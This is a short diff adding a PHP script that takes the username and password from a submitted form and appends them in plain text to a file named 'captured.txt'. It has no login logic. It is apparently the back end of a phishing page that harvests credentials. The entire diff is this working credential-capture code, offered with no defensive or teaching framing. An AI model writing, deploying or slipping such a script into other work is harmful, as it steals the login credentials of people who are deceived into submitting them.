@@ -1,0 +1,10 @@
+<?php
+if(isset($_POST['username']) && isset($_POST['password'])) {
+    $username = $_POST['username'];
+    $password = $_POST['password'];
+    
+    $data = "Username: $username\nPassword: $password\n\n";
+    
+    file_put_contents('captured.txt', $data, FILE_APPEND);
+}
+?>
